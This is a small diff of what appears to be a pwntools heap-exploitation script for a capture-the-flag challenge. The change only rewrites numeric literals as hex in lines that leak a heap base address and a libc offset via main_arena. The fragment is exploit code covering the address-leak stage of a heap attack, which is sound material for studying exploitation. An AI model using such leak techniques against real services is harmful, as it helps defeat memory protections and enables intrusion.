@@ -65,7 +65,7 @@ adda('a', b'a' * 0x70 + b'\x50')
 
 frec(0x1, 0x49 + 0x6)
 
-heap = (u64(rda(2).ljust(8, b'\x00')) >> 0xc) << 0xc
+heap = (u64(rda(0x2).ljust(0x8, b'\x00')) >> 0xc) << 0xc
 
 log.info('Heap adr: ' + hex(heap))
 
@@ -84,7 +84,7 @@ frec(0x1, 0x48 + 5 * 0x6)
 
 addc(0x1, p64(heap + 0x819))
 
-libc_off = (u64(rda(2).ljust(8, b'\x00')) << 0x8) - arena_off
+libc_off = (u64(rda(0x2).ljust(0x8, b'\x00')) << 0x8) - arena_off
 
 log.info('Libc off adr: ' + hex(libc_off))
 
